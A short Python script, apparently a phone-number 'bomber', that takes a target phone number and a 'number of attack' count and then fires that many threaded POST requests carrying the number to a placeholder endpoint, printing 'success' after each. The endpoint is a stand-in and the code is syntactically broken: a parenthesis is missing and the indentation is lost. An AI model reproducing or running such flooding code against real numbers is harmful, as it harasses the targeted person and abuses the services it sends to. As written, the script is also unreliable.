import requests,threading
from threading import Thread

print("abc")
phone = input ("phone : ")
z = int(input ("number of attack : ")

def a():
requests.post("http://a.co", data = {"a":phone}, headers =
{"abc": "1"})
print("success")

for i in range(z):
threading. Thread(target=a).start()
